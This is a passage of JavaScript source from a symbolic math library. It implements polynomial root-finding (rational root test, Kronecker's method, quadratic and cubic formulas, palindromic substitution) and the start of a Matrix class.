      var coefficient = i === -1 ? Expression.ZERO : this.a.coefficient(i);
      if (i !== this.a.length - 1) {
        n = n.multiply(Expression.pow(point, lastDegree - degree));
      }
      if (i !== -1) {
        n = n.add(coefficient);
      }
      lastDegree = degree;
    }
    return n;
  };

  Polynomial.prototype.getContent = function () {
    if (this.a.length === 0) {
      throw new RangeError();
    }
    var x = this.a.coefficient(this.a.length - 1);
    var denominator = x.getDenominator();
    var numerator = x.getNumerator();
    var i = this.a.length - 1;
    while (--i >= 0) {
      var y = this.a.coefficient(i);
      denominator = denominator.lcm(y.getDenominator());
      numerator = numerator.gcd(y.getNumerator());
    }
    var c = numerator.divide(denominator);
    return x.isNegative() && !numerator.isNegative() ? c.negate() : c;
  };

  // add, multiply, divideAndRemainder

  Polynomial.prototype.negate = function () {
    //TODO: fix
    return this.map(function (coefficient, degree) {
      return coefficient.negate();
    });
  };

  Polynomial.prototype.subtract = function (l) {
    return this.add(l.negate());
  };

  Polynomial.prototype.scale = function (x) {
    return this.map(function (coefficient, degree) {
      return coefficient.multiply(x);
    });
  };

  Polynomial.toPolynomial = function (e, v) {
    if (e instanceof Expression.Division) {
      throw new RangeError();
    }
    var coefficients = Expression.getCoefficients(e, v);
    var newData = new PolynomialData(coefficients.length);
    for (var i = 0; i < coefficients.length; i += 1) {
      var x = coefficients[i];
      var d = x.degree.toNumber();
      var c = x.coefficient;
      newData.add(d, c);
    }
    return new Polynomial(newData.trim());
  };

  Polynomial.prototype.toExpression = function (variableSymbol) {
    var i = this.a.length;
    var result = undefined;
    while (--i >= 0) {
      var degree = this.a.degree(i);
      var coefficient = this.a.coefficient(i);
      var v = degree === 0 ? undefined : (degree === 1 ? variableSymbol : new Expression.Exponentiation(variableSymbol, Expression.Integer.fromNumber(degree)));
      var current = v == undefined ? coefficient : (coefficient.equals(Expression.ONE) ? v : new Expression.Multiplication(coefficient, v));
      result = result == undefined ? current : new Expression.Addition(result, current);
    }
    return result == undefined ? Expression.ZERO : result;
  };

  // return a first founded root to simplify and as the next call may be called with reduced coefficients
  Polynomial.prototype.doRationalRootTest = function () {
    var np = this;
    var an = np.getLeadingCoefficient();
    var a0 = np.getCoefficient(0);

    //TODO: http://en.wikipedia.org/wiki/Polynomial_remainder_theorem

    // http://scask.ru/g_book_mav.php?id=26
    var hasIntegerCoefficients = np._hasIntegerCoefficients();
    // f(k) = -q(a)(a - k)
    var filter = [];
    if (hasIntegerCoefficients) {
      if (np.calcAt(Expression.ONE).equals(Expression.ZERO)) {
        return Expression.ONE;
      }
      filter.push({k: Expression.ONE, fk: np.calcAt(Expression.ONE)});
      if (np.calcAt(Expression.ONE.negate()).equals(Expression.ZERO)) {
        return Expression.ONE.negate();
      }
      filter.push({k: Expression.ONE.negate(), fk: np.calcAt(Expression.ONE.negate())});
    }

    /*
    TODO: 
    k = k
    f(k) = fk
    t = x + k
    x = t - k
    f(t) = f(x + k) = an * x**n + ... + f(k)
    */
    

    var result = null;
    // p/q
    //TODO: forEach -> some ?
    Expression.everyDivisor(a0, function (p) {
      return Expression.everyDivisor(an, function (q) {
        var sign = -3;
        while ((sign += 2) < 3) {
          var sp = sign === -1 ? p.negate() : p;

          var i = 0;
          while (i < filter.length && !filter[i].k.multiply(sp).subtract(q).equals(Expression.ZERO) && filter[i].fk.remainder(filter[i].k.multiply(sp).subtract(q)).equals(Expression.ZERO)) {
            i += 1;
          }
          var filteredOut = i < filter.length;

          if (//sp.gcd(q).equals(Expression.ONE) &&
              !filteredOut) {//?
            var x = Polynomial.of(sp.negate(), q);
            var z = np.divideAndRemainder(x, "undefined");
            if (z != undefined && z.remainder.equals(Polynomial.ZERO)) {
              result = sp.divide(q);
              return false;
            }
          }
        }
        return true;
      });
    });

    return result;
  };
  
  Polynomial.prototype._hasIntegerCoefficients = function () {
    for (var i = 0; i <= this.getDegree(); i += 1) {
      if (!(this.getCoefficient(i) instanceof Expression.Integer)) {
        return false;
      }
    }
    return true;
  };

  Polynomial.prototype._hasIntegerLikeCoefficients = function () {
    var isIntegerLike = function (c) {
      if (c instanceof Expression.Integer) {
        return true;
      }
      if (c instanceof Expression.Symbol) {
        return true;
      }
      if (c instanceof Expression.Addition) {
        return isIntegerLike(c.a) && isIntegerLike(c.b);
      }
      if (c instanceof Expression.Multiplication) {
        return isIntegerLike(c.a) && isIntegerLike(c.b);
      }
      if (c instanceof Expression.Exponentiation) {
        return isIntegerLike(c.a) && c.b instanceof Expression.Integer;
      }
      return false;
    };
    var integerLikeCoefficients = true;
    for (var i = 0; i <= this.getDegree(); i += 1) {
      integerLikeCoefficients = integerLikeCoefficients && isIntegerLike(this.getCoefficient(i));
    }
    return integerLikeCoefficients;
  };

  Polynomial.prototype._getFactorByKroneckersMethod = function () {
    // https://ru.wikipedia.org/wiki/%D0%9C%D0%B5%D1%82%D0%BE%D0%B4_%D0%9A%D1%80%D0%BE%D0%BD%D0%B5%D0%BA%D0%B5%D1%80%D0%B0
    // https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D1%82%D0%B5%D1%80%D0%BF%D0%BE%D0%BB%D1%8F%D1%86%D0%B8%D0%BE%D0%BD%D0%BD%D1%8B%D0%B9_%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE%D1%87%D0%BB%D0%B5%D0%BD_%D0%9B%D0%B0%D0%B3%D1%80%D0%B0%D0%BD%D0%B6%D0%B0
    // https://en.wikipedia.org/wiki/Vandermonde_matrix
    var np = this;
    if (!np._hasIntegerLikeCoefficients()) {
      return undefined;
    }
    var n = np.getDegree();
    var ys = new Array(n);
    var total = 1;
    for (var i = 0; i <= Math.floor(n / 2); i += 1) {
      var bi = Expression.Integer.fromNumber(i);
      var y = np.calcAt(bi);
      if (y.equals(Expression.ZERO)) {
        return Polynomial.of(bi.negate(), Expression.ONE);
      }
      var attachNegative = function (array) {
        var result = new Array(array.length * 2);
        for (var i = 0; i < array.length; i += 1) {
          result[i * 2] = array[i];
          result[i * 2 + 1] = array[i].negate();
        }
        return result;
      };
      var divisors = [];
      Expression.everyDivisor(y, function (d) {
        divisors.push(d);
        return true;
      });
      // let the first be positive as two sets with different signs give polynomials that differ only in sign of coefficients
      ys[i] = i === 0 ? divisors : attachNegative(divisors);
      total *= ys[i].length;
      var V = Matrix.Zero(i + 1, i + 1).map(function (e, i, j) {
        return Expression.pow(Expression.Integer.fromNumber(i), j);
      });
      var inv = V.inverse();
      //scale?
      inv = inv.scale(V.determinant());
      //?
      var u = new Array(i + 1);
      for (var j = 0; j < i + 1; j += 1) {
        u[j] = 0;
      }
      u[0] = -1;
      for (var j = 0; j < total; j += 1) {
        var k = 0;
        u[k] += 1;
        while (u[k] === ys[k].length) {
          u[k] = 0;
          k += 1;
          u[k] += 1;
        }
        var y = Matrix.Zero(i + 1, 1).map(function (e, i, j) {
          return ys[i][u[i]];
        });
        var s = inv.multiply(y);
        var polynomialFromVector = function (s) {
          var c = new Array(s.rows());
          for (var j = 0; j < s.rows(); j += 1) {
            c[j] = s.e(j, 0);
          }
          return Polynomial.from(c);
        };
        var g = polynomialFromVector(s);
        //if (g.getDegree() > 0 && np.divideAndRemainder(g).remainder.equals(Polynomial.ZERO)) {
        //  return g;
        //}
        if (g.getDegree() > 0) {
          var gc = g.getContent();
          g = g.scale(gc.getDenominator()).divideAndRemainder(Polynomial.of(gc.getNumerator()), "throw").quotient;
          var t = np.divideAndRemainder(g, "undefined");
          if (t != undefined && t.remainder.equals(Polynomial.ZERO)) {
            return g;
          }
        }
      }
    }
    return undefined;
  };

  Polynomial.prototype.getroots = function (callback) {
    //TODO: merge hit and callback
    callback = callback || undefined;
    var np = this;

    var roots = [];


    //!new 2018-12-24
    //TODO: fix (?Polynomial#getContent()?)
      var t = Expression.ZERO;
      while (t != null) {
        var t = Expression.getConjugate(np.getCoefficient(np.getDegree()));
        if (t != undefined) {
          np = np.scale(t);
        }
      }
    //!

    var content = np.getContent();
    if (!content.equals(Expression.ONE)) {
      np = np.scale(content.getDenominator()).divideAndRemainder(Polynomial.of(content.getNumerator()), "throw").quotient;
      //np = np.divideAndRemainder(Polynomial.of(content), "throw").quotient;
    }
    
    

    // x = 0
    while (np.getCoefficient(0).equals(Expression.ZERO)) {
      np = np.divideAndRemainder(Polynomial.of(Expression.ZERO, Expression.ONE), "throw").quotient;
      roots.push(Expression.ZERO);
    }
    if ((!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate())) || roots.length > 0) {
      if (roots.length > 0) {
        if (typeof hit === "function") {
          hit({getroots: {special: "0"}});
        }
      }
      if (callback != undefined) {
        callback({content: content, roots: roots, newPolynomial: np, type: "factorOutTheGreatestCommonFactor"});
      }
    }

    if (np.getDegree() === 1) {
      roots.push(np.getCoefficient(0).negate().divide(np.getCoefficient(1)));
      np = Polynomial.of(np.getCoefficient(1));
      if (typeof hit === "function") {
        hit({getroots: {linear: ""}});
      }
      if (callback != undefined) {
        callback({content: content, roots: roots, newPolynomial: np, type: "solveLinearEquation"});
      }
      return roots;
    }

    var nthRootInternal = function (n, x) {
      if (x instanceof Expression.Division) {
        var sa1 = nthRootInternal(n, x.a);
        var sb1 = nthRootInternal(n, x.b);
        return sa1 == undefined || sb1 == undefined ? undefined : sa1.divide(sb1);
      }
      if (x instanceof Expression.Exponentiation) {
        var N = Expression.Integer.fromNumber(n);
        if (x.b instanceof Expression.Integer) {
          if (x.b.remainder(N).equals(Expression.ZERO)) {
            return x.a.pow(x.b.divide(N));
          }
          //return undefined;
        }
        if (x.a instanceof Expression.Integer || x.a === Expression.E) {//?
          return x.a.pow(x.b.divide(N));
        }
        if (x.b instanceof Expression.Division && x.b.a instanceof Expression.Integer && x.b.a.remainder(N).equals(Expression.ZERO)) {//TODO: 
          return x.a.pow(x.b.divide(N));
        }
      }
      if (x instanceof Expression.Multiplication) {
        var sa = nthRootInternal(n, x.a);
        var sb = nthRootInternal(n, x.b);
        return sa == undefined || sb == undefined ? undefined : sa.multiply(sb);
      }
      if (x instanceof Expression.Complex) {
        //TODO: - ?
        if (n === 2) {
          var m = x.real.multiply(x.real).add(x.imaginary.multiply(x.imaginary)).squareRoot();
          var g = nthRootInternal(2, x.real.add(m).divide(Expression.TWO));
          var d = nthRootInternal(2, x.real.negate().add(m).divide(Expression.TWO));
          if (g != undefined && d != undefined) {
            var result = g.add((x.imaginary.compareTo(Expression.ZERO) < 0 ? d.negate() : d).multiply(Expression.I));
            return result;
          }
        }
        if (x.real.equals(Expression.ZERO) && n % 2 === 0) {
          var c = nthRootInternal(Math.floor(n / 2), x);
          if (c != undefined) {
            return nthRootInternal(2, c);
          }
        }
        if (x.real.equals(Expression.ZERO) && n % 2 === 1) {
          //?
          var c = nthRootInternal(n, x.imaginary);
          if (c != undefined) {
            return c.multiply((n % 4 === 1 ? Expression.I : Expression.I.negate()));
          }
        }
      }
      if (x instanceof Expression.Addition) {
        var lastFactor = undefined;
        var e = 0;
        var result = Expression.ONE;
        var rest = Expression.ONE;
        var t = x;
        while (!t.equals(Expression.ONE) && !t.equals(Expression.ONE.negate())) {
          var f = Expression.simpleDivisor(t);
          if (e === 0) {
            lastFactor = f;
            e += 1;
          } else if (f.equals(lastFactor)) {
            e += 1;
            if (e === n) {
              e = 0;
              result = result.multiply(lastFactor);
            }
          } else if (e !== 0) {
            rest = rest.multiply(Expression.pow(lastFactor, e));
            lastFactor = f;
            e = 1;
          }
          t = t.divide(f);
        }
        if (result !== Expression.ONE) {
          if (e !== 0) {
            rest = rest.multiply(Expression.pow(lastFactor, e));
          }
          if (t.equals(Expression.ONE.negate())) {
            rest = rest.multiply(t);
          }
          var rn = nthRootInternal(n, rest);
          if (rn != undefined) {
            return result.multiply(rn);
          }
        }
      }
      if (x instanceof Expression.Exponentiation && x.a instanceof Expression.Symbol) {
        var b = x.b.divide(Expression.Integer.fromNumber(n));
        return b.equals(Expression.ONE) ? x.a : new Expression.Exponentiation(x.a, b);
      }
      if (!Expression.isConstant(x) && x.isNegative() && (n === 2 || n % 2 !== 0)) {
        x = x.negate();
        var c = nthRootInternal(n, x);
        return c == null ? null : Expression.ONE.negate()._nthRoot(n).multiply(c);
      }
      if ((x instanceof Expression.Integer || x instanceof Expression.Complex) && x.isNegative() && n % 2 === 0) {//?
        var c = x instanceof Expression.Integer ? x._nthRoot(2) : nthRootInternal(2, x);
        return c == null ? null : nthRootInternal(n / 2, c);
      }
      var y = undefined;
      try {
        y = x._nthRoot(n);
      } catch (error) {
        //TODO:
        console.error(error);
      }
      return y;
    };

    var nthRoot = function (n, x, np) {
      if (n === 1) {
        return x;
      }
      var y = nthRootInternal(n, x);
      if (y == undefined) {
        if (!(x instanceof Expression.Integer)) {
          if (typeof hit === "function") {
            hit({nthRoot: (n === 2 ? "squareRoot" : (n === 3 ? "cubeRoot" : n + "-root")) + ":" + x.toString() + ":" + np.toString()});
          }
        }
      }
      return y;
    };

    var continueWithNewPolynomial = function (roots, np) {
      var rs = np.getroots(callback != undefined ? function (info) {
        var xxx = Object.assign({}, info, {content: content.multiply(info.content), roots: roots.concat(info.roots)});
        callback(xxx);
      } : undefined);
      for (var i = 0; i < rs.length; i += 1) {
        roots.push(rs[i]);
      }
    };

    if (np.getDegree() >= 2) {
      var gcd = function (a, b) {
        return b === 0 ? a : gcd(b, a % b);
      };
      var g = np.getDegree();
      for (var i = 1; i <= np.getDegree(); i += 1) {
        if (!np.getCoefficient(i).equals(Expression.ZERO)) {
          g = gcd(g, i);
        }
      }
      if (g >= 2) {
        var allZeros = g === np.getDegree();
        if (typeof hit === "function") {
          if (g === np.getDegree()) {
            hit({getroots: {allZeros: ""}});
          } else {
            hit({getroots: g % 2 === 0 ? (np.getDegree() === 4 ? {biquadratic: ""} : {even: ""}) : {xyz: np.toString()}});
          }
        }
        // t = x^g
        var newData = new Array(Math.floor((np.getDegree() + g) / g));
        var k = 0;
        for (var i = 0; i <= np.getDegree(); i += g) {
          newData[k] = np.getCoefficient(i);
          k += 1;
        }
        var q = Polynomial.from(newData);
        var qRoots = q.getroots();
        var n = np.getDegree();//TODO: 2018-02-04
        //var ok = false;//?
        for (var k = 0; k < qRoots.length; k += 1) {
          var qRoot = qRoots[k];
          var s = nthRoot(g, qRoot, np);
          if (s != undefined) {
            var d = Polynomial.of(Expression.ONE).shift(g).add(Polynomial.of(s.negate()));
            if ((!allZeros || g > 4) && g <= 24 && ((17896830 >> g) & 1) === 1) {
              var c = Expression.E.pow(Expression.I.multiply(Expression.TWO.multiply(Expression.PI)).divide(Expression.Integer.fromNumber(g)));
              for (var i = 0; i < g; i += 1) {
                var root = Expression.pow(c, i).multiply(s);
                roots.push(root);
              }
            } else {
            roots.push(s);
            var d = Polynomial.of(s.negate(), Expression.ONE);
            if (g % 2 === 0) {
              roots.push(s.negate());
              d = Polynomial.of(nthRoot(g / 2, qRoot, np).negate(), Expression.ZERO, Expression.ONE);
            }
            }
            np = np.divideAndRemainder(d).quotient;
          }
          //ok = ok || Expression.has(qRoot, Expression.Complex);//?
        }
        if (callback != undefined) {
          var type = allZeros ? (g === 2 ? "applyDifferenceOfSquaresRule" : (g === 3 ? "applyDifferenceOfCubesRule" : "applyDifferenceOfNthPowersRule")) : "t = x^g";
          callback({content: content, roots: roots, newPolynomial: np, type: type, g: g});//TODO: ?
        }
        var ok = true;
        if (n !== np.getDegree() && ok && np.getDegree() > 0) {
          continueWithNewPolynomial(roots, np);
        }
        return roots;
      }
    }

    //! new: solution of quadratic equations
    if (np.getDegree() === 2) {
      var a = np.getCoefficient(2);
      var b = np.getCoefficient(1);
      var c = np.getCoefficient(0);

      var D = b.multiply(b).subtract(Expression.TWO.multiply(Expression.TWO).multiply(a).multiply(c));
      D = D.simplifyExpression();
      var sD = nthRoot(2, D, np);
      if (typeof hit === "function") {
        hit({getroots: {quadratic: (sD == undefined ? (D instanceof Expression.Integer ? D.compareTo(Expression.ZERO) : "?" + D.toString()) : "OK")}});
      }
      if (sD != undefined) {
        var x1 = b.negate().subtract(sD).divide(Expression.TWO.multiply(a));
        var x2 = b.negate().add(sD).divide(Expression.TWO.multiply(a));
        roots.push(x1);
        roots.push(x2);
        np = Polynomial.of(a);
        if (callback != undefined) {
          callback({content: content, roots: roots, newPolynomial: np, type: "solveQuadraticEquation"});
        }
        return roots;
      }
    }

    //TODO: odd degrees ?
    if (np.getDegree() >= 4 && np.getDegree() % 2 === 0) {
      var middle = Math.floor(np.getDegree() / 2);
      var j = 1;
      while (j < middle + 1 && np.getCoefficient(middle + j).equals(Expression.ZERO) && np.getCoefficient(middle - j).equals(Expression.ZERO)) {
        j += 1;
      }
      if (j < middle + 1 && !np.getCoefficient(middle + j).equals(Expression.ZERO) && !np.getCoefficient(middle - j).equals(Expression.ZERO)) {
        var jj = Expression.Integer.fromNumber(j);
        var mj = np.getCoefficient(middle + j).divide(np.getCoefficient(middle - j));
        var isQuasiPalindromic = true;
        for (var i = 2; i < middle + 1; i += 1) {
          isQuasiPalindromic = isQuasiPalindromic && np.getCoefficient(middle + i).pow(jj).subtract(np.getCoefficient(middle - i).pow(jj).multiply(mj.pow(Expression.Integer.fromNumber(i)))).equals(Expression.ZERO);
        }
        if (isQuasiPalindromic) {
          //TODO: fix
          if (typeof hit === "function") {
            hit({getroots: {quasiPalindromic: np.getDegree()}});
          }
        }
        if (isQuasiPalindromic && np.getDegree() <= 53) { // Math.log2(9007199254740991 + 1)
          var substitute = function (m, np) { // t = mx + 1 / x
            // https://stackoverflow.com/a/15302448/839199
            var choose = function (n, k) {
              return k === 0 ? 1 : Math.floor((n * choose(n - 1, k - 1)) / k);
            };
            var p = function (n, i, mpi) {
              return n - 2 * i >= 0 ? p(n - 2 * i, 1, m).scale(Expression.Integer.fromNumber(choose(n, i)).multiply(mpi).negate()).add(p(n, i + 1, mpi.multiply(m))) : Polynomial.of(Expression.ONE).shift(n);
            };
            var f = function (n, i) {
              return i <= n ? p(n - i, 1, m).scale(np.getCoefficient(i)).add(f(n, i + 1)) : Polynomial.ZERO;
            };
            return f(Math.floor(np.getDegree() / 2), 0);
          };
          var m = j === 1 ? mj : nthRoot(j, mj, np); // TODO: check the result of nthRoot - ?
          // t = mx + 1 / x
          var pt = substitute(m, np);
          //var pt = Polynomial.of(np.getCoefficient(2).subtract(Expression.ONE.add(Expression.ONE).multiply(m).multiply(np.getCoefficient(0))), np.getCoefficient(1), np.getCoefficient(0));
          var ptRoots = pt.getroots();
          for (var i = 0; i < ptRoots.length; i += 1) {
            var ptRoot = ptRoots[i];
            // mx^2 - tx + 1 = 0
            var u = Polynomial.of(Expression.ONE, ptRoot.negate(), m);
            var uRoots = u.getroots();
            for (var j = 0; j < uRoots.length; j += 1) {
              var root = uRoots[j];
              np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient;
              roots.push(root);
            }
          }
          if (callback != undefined) {
            callback({content: content, roots: roots, newPolynomial: np, type: "solvePalindromicEquaion"});
          }
          return roots;
        }
      }
    }

    if (np.getDegree() >= 2) {
      var root = np.doRationalRootTest();
      if (root != null) {
        np = np.divideAndRemainder(Polynomial.of(root.getNumerator().negate(), root.getDenominator())).quotient;
        roots.push(root);
        if (typeof hit === "function") {
          hit({getroots: {rational: ""}});
        }
        if (callback != undefined) {
          callback({content: content, roots: roots, newPolynomial: np, type: "useTheRationalRootTest"});
        }
        if (np.getDegree() > 0) {
          continueWithNewPolynomial(roots, np);
        }
        return roots;
      }
    }

    if (np.getDegree() >= 2) {//?
      // (ax+b)**n = a**n*x**n + n*a**(n-1)*x**(n-1)*b + ...
      //?
      // a**n
      // n*a**(n-1)*b
      var n = np.getDegree();
      var hasZeroCoefficients = function (np) {
        for (var i = 0; i <= np.getDegree(); i += 1) {
          if (np.getCoefficient(i).equals(Expression.ZERO)) {
            return true;
          }
        }
        return false;
      };
      if (!hasZeroCoefficients(np)) {
        var g = np.getCoefficient(n - 1).divide(np.getCoefficient(n)).divide(Expression.Integer.fromNumber(n));
        var ok = true;
        for (var k = np.getDegree() - 1; k >= 1 && ok; k -= 1) {
          ok = g.equals(np.getCoefficient(k - 1).divide(np.getCoefficient(k)).multiply(Expression.Integer.fromNumber(n - k + 1)).divide(Expression.Integer.fromNumber(k)));
        }
        if (ok) {
          var root = g.negate();
          for (var k = 0; k < n; k += 1) {
            roots.push(root);
          }
          np = Polynomial.of(Expression.pow(root.negate().getDenominator(), n));
          if (callback != undefined) {
            callback({content: content, roots: roots, newPolynomial: np, type: "(ax+b)**n"});//TODO:
          }
          return roots;
        }
      }
    }

    if (np.getDegree() === 3) {
      // https://en.wikipedia.org/wiki/Cubic_function#Algebraic_solution
      var a = np.getCoefficient(3);
      var b = np.getCoefficient(2);
      var c = np.getCoefficient(1);
      var d = np.getCoefficient(0);
      var TWO = Expression.TWO;
      var THREE = TWO.add(Expression.ONE);
      var FOUR = TWO.add(TWO);
      var NINE = THREE.multiply(THREE);
      var EIGHTEEN = NINE.multiply(TWO);
      var TWENTY_SEVEN = NINE.multiply(THREE);
      // 18*a*b*c*d-4*b^3*d+b^2*c^2-4*a*c^3-27*a^2*d^2
      var delta = EIGHTEEN.multiply(a).multiply(b).multiply(c).multiply(d)
                  .subtract(FOUR.multiply(b.pow(THREE)).multiply(d))
                  .add(b.pow(TWO).multiply(c.pow(TWO)))
                  .subtract(FOUR.multiply(a).multiply(c.pow(THREE)))
                  .subtract(TWENTY_SEVEN.multiply(a.pow(TWO)).multiply(d.pow(TWO)));
      // b^2-3*a*c
      var delta0 = b.pow(TWO).subtract(THREE.multiply(a).multiply(c));
      if (typeof hit === "function") {
        hit({getroots: {cubic: (delta instanceof Expression.Integer ? delta.compareTo(Expression.ZERO) : "?") + "-" + (delta0 instanceof Expression.Integer ? delta0.compareTo(Expression.ZERO) : "?")}});
      }
      if (delta.equals(Expression.ZERO)) {
        if (delta0.equals(Expression.ZERO)) {
          //TODO: link to a^3+3a^2b+3ab^2+b^3=0 - ?
          // -b/(3*a)
          var root = b.negate().divide(THREE.multiply(a));
          roots.push(root);
          roots.push(root);
          roots.push(root);
          var p = Polynomial.of(root.negate(), Expression.ONE);
          np = np.divideAndRemainder(p.multiply(p).multiply(p)).quotient;
          if (callback != undefined) {
            callback({content: content, roots: roots, newPolynomial: np, type: "solveCubicEquation"});
          }
          return roots;
        } else {
          // https://github.com/nicolewhite/algebra.js/blob/master/src/equations.js
          // https://en.wikipedia.org/wiki/Cubic_function#Multiple_roots.2C_.CE.94_.3D_0
          // a double root
          // 9*a*d-b*c
          var root = NINE.multiply(a).multiply(d).subtract(b.multiply(c)).divide(TWO.multiply(delta0));
          roots.push(root);
          roots.push(root);
          var p = Polynomial.of(root.negate(), Expression.ONE);
          np = np.divideAndRemainder(p.multiply(p)).quotient;
          roots.push(np.getCoefficient(0).negate().divide(np.getCoefficient(1)));
          np = Polynomial.of(np.getCoefficient(1));
          if (callback != undefined) {
            callback({content: content, roots: roots, newPolynomial: np, type: "solveCubicEquation"});
          }
          return roots;
        }
      } else {
        // 2*b^3-9*a*b*c+27*a^2*d
        var delta1 = TWO.multiply(b.pow(THREE)).subtract(NINE.multiply(a).multiply(b).multiply(c)).add(TWENTY_SEVEN.multiply(a.pow(TWO)).multiply(d));
        var C = undefined;
        if (delta0.equals(Expression.ZERO)) {
          C = nthRoot(3, delta1, np);
        } else {
          var tmp = nthRoot(2, delta1.pow(TWO).subtract(FOUR.multiply(delta0.pow(THREE))), np);
          if (tmp != undefined) {
            C = nthRoot(3, delta1.add(tmp).divide(TWO), np);
          }
        }
        if (C != undefined) {
          var root = b.add(C).add(delta0.divide(C)).negate().divide(THREE.multiply(a));
          roots.push(root);

          if (true) {
            var C1 = C.multiply(Expression.ONE.negate().add(THREE.squareRoot().multiply(Expression.I)).divide(TWO)); // C*(-1+sqrt(3)*i)/2
            var root = b.add(C1).add(delta0.divide(C1)).negate().divide(THREE.multiply(a));
            roots.push(root);

            var C2 = C.multiply(Expression.ONE.negate().subtract(THREE.squareRoot().multiply(Expression.I)).divide(TWO)); // C*(-1-sqrt(3)*i)/2
            var root = b.add(C2).add(delta0.divide(C2)).negate().divide(THREE.multiply(a));
            roots.push(root);

            np = Polynomial.of(np.getCoefficient(3));//TODO: check + test coverage
            if (callback != undefined) {
              callback({content: content, roots: roots, newPolynomial: np, type: "solveCubicEquation"});
            }
          } else {
            np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient;
            if (callback != undefined) {
              callback({content: content, roots: roots, newPolynomial: np, type: "solveCubicEquation"});
            }
            continueWithNewPolynomial(roots, np);
          }

          return roots;
        }
      }
    }

    if (np.getDegree() >= 4) {
      if (true) {
        //TODO: performance
        var isSmall = function () {
          var c = 1;
          for (var i = 0; i <= np.getDegree(); i += 1) {
            var k = np.getCoefficient(i);
            //TODO: ilog2(k)
            if (!k.equals(Expression.ZERO)) {
              c *= k instanceof Expression.Integer ? Math.floor(Math.log(Math.abs(k.toNumber()) + 0.5) / Math.log(2)) + 1 : 1;
            }
          }
          return c <= 4 * 1024;
        };
        //console.time('Kronecker\'s method');
        var g = isSmall() ? np._getFactorByKroneckersMethod() : undefined; // too slow
        //console.timeEnd('Kronecker\'s method');
        if (g != undefined) {
          var h = np.divideAndRemainder(g).quotient;
          var gr = g.getroots();
          for (var i = 0; i < gr.length; i += 1) {
            roots.push(gr[i]);
            np = np.divideAndRemainder(Polynomial.of(gr[i].negate(), Expression.ONE)).quotient;//TODO: optimize somehow - ?
          }
          var hr = h.getroots();
          for (var i = 0; i < hr.length; i += 1) {
            roots.push(hr[i]);
            np = np.divideAndRemainder(Polynomial.of(hr[i].negate(), Expression.ONE)).quotient;//TODO: optimize somehow - ?
          }
          if (hr.length > 0 || gr.length > 0) {
            if (typeof hit === "function") {
              hit({getroots: {methodOfKronecker: np.toString()}});
            }
            if (callback != undefined) {
              callback({content: content, roots: roots, newPolynomial: np, type: "methodOfKronecker"});//?
            }
          }
          return roots;
        }
      }
    }

    //!2018-12-23
    if (np.getDegree() > 2) {
      // https://en.wikipedia.org/wiki/Square-free_polynomial
      //var gcd = function (a, b) {
      //  return b.getDegree() === -1 ? a : gcd(b, a.divideAndRemainder(b).remainder);
      //};
      var f = np;
      var d = f.derive();
      var a0 = Polynomial.polynomialGCD(f, d);
      if (a0.getDegree() > 0) {
        //TODO: merge with a code for Kronecker's method
        a0 = a0.scale(a0.getContent().inverse());//!?
        var q = f.divideAndRemainder(a0).quotient;
        var a0r = a0.getroots();
        for (var i = 0; i < a0r.length; i += 1) {
          var root = a0r[i];
          while (np.calcAt(root).equals(Expression.ZERO)) {
            roots.push(root);
            np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient;//TODO: optimize somehow - ?
          }
          q = q.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient;//TODO: optimize somehow - ?
        }
        if (a0r.length > 0) {
          if (typeof hit === "function") {
            hit({getroots: {squareFreeRoot: np.toString()}});
          }
          continueWithNewPolynomial(roots, np);
          return roots;
        }
      }
    }
    //!

    if (np.getDegree() >= 4) {
      //TODO: fix
      if (typeof hit === "function") {
        hit({getroots: {other: np.getDegree()}});
      }
    }

    return roots;
  };

  Polynomial.prototype.derive = function () {
    var newData = new PolynomialData(this.a.length - 1);
    for (var i = 1; i < this.a.length; i += 1) {
      var n = this.a.degree(i);
      var c = this.a.coefficient(i);
      newData.add(n - 1, c.multiply(Expression.Integer.fromNumber(n)));
    }
    return new Polynomial(newData);
  };

  self.Polynomial = Polynomial;

})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */

  

  //    API same as http://sylvester.jcoglan.com/api/matrix.html
  //    new Matrix([
  //      [1, 2, 3],
  //      [5, 6, 7],
  //      [7, 8,-1]
  //    ]);

  function Matrix(data) {
    this.a = data;
  }

  Matrix.Zero = function (rows, cols) {
    var a = new Array(rows);
    var i = -1;
    while (++i < rows) {
      var j = -1;
      var x = new Array(cols);
      while (++j < cols) {
        x[j] = Expression.ZERO;
      }
      a[i] = x;
    }
    return new Matrix(a);
  };

  // identity n x n;
  Matrix.I = function (n) {
    return Matrix.Zero(n, n).map(function (element, i, j) {
      return (i === j ? Expression.ONE : Expression.ZERO);
    });
  };

  Matrix.prototype.rows = function () {
    return this.a.length;
  };

  Matrix.prototype.cols = function () {
    return this.a.length > 0 ? this.a[0].length : 0;
  };

  Matrix.prototype.e = function (i, j) {
    return this.a[i][j];
  };

  Matrix.prototype.isSquare = function () {
    return this.rows() > 0 && this.rows() === this.cols();//?
  };

  Matrix.prototype.map = function (callback) {
    var rows = this.rows();
    var cols = this.cols();
    var c = new Array(rows);
    var i = -1;
    while (++i < rows) {
      var x = new Array(cols);
      var j = -1;
      while (++j < cols) {
        var e = callback.call(undefined, this.e(i, j), i, j, this);
        x[j] = e.simplifyExpression();//?
      }
      c[i] = x;
    }
    return new Matrix(c);
  };

  Matrix.prototype.transpose = function () {
    var that = this;
    return Matrix.Zero(that.cols(), that.rows()).map(function (element, i, j) {
      return that.e(j, i);
    });
  };

  Matrix.prototype.scale = function (k) {
    return this.map(function (element, i, j) {
      return element.multiply(k);
    });
  };

  Matrix.prototype.multiply = function (b) {
    var a = this;
    if (a.cols() !== b.rows()) {
      throw new RangeError("DimensionMismatchException");
    }
    return Matrix.Zero(a.rows(), b.cols()).map(function (element, i, j) {
      var rows = b.rows();
      var k = -1;
      while (++k < rows) {
        //! this code is used to show not simplified expressions
        var current = a.e(i, k).multiply(b.e(k, j));
        element = k === 0 ? current : element.add(current);
      }
      return element;
    });
  };

  Matrix.prototype.add = function (b) {
    var a = this;
    if (a.rows() !== b.rows() || a.cols() !== b.cols()) {
      throw new RangeError("MatrixDimensionMismatchException");
    }
    return a.map(function (elem, i, j) {
      return elem.add(b.e(i, j));
    });
  };

